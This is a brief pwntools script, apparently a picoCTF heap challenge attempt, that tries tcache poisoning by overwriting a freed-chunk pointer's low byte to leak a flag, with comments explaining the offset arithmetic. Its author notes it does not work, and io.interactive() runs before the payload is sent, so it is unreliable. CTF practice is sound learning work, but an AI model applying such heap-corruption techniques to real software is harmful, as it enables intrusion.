from pwn import *

io = remote('mercury.picoctf.net', 34499)

# We need to edit the pointer to the next free chunk in the tcache linked list of free chunks
# To do this, we can break at the place right before the input, and run heap bins to see the linked list
# We see that currently the chunk at the top is the rubbish one which we do not want, but the 2nd chunk which was freed before the first chunk, contains the flag
# So we need to modify the pointer from mainarena to the 1st chunk in the linked list, to point to the 2nd chunk instead. This way, the next malloc() call will return the address of the 2nd chunk first, which can print the flag
# To do that, we grep for the address that contains the address of the first chunk, and pick the result from heap. That address is likely where the pointer to the first chunk is stored, so we want to change it
# Take note that the pointer is in little endian so the least significant byte is at the beginning of the address. Say the address of the chunk we want is 0x12345678, the value at the pointer will be 0x78. In our case, we need to change it from 0x603890 to 0x603800, so we change the LSB from 90 to 0
# Thats why we write 0x0 as the byte there. In order to locate the correct place, we need to use relative offset relative from the address of the initial pointer before the loop, which is 0x603a40 - 0x602088. 0x602088 is the address that contains the pointer to 0x603890, while 0x603a40 is the address of the first chunk allocated

offset = 0x602088 - 0x603a40
io.interactive()
io.send(str(offset).encode() + b'\x00')
io.send(p32(0x0) + b'\x00')

# not working they prob changed the binary
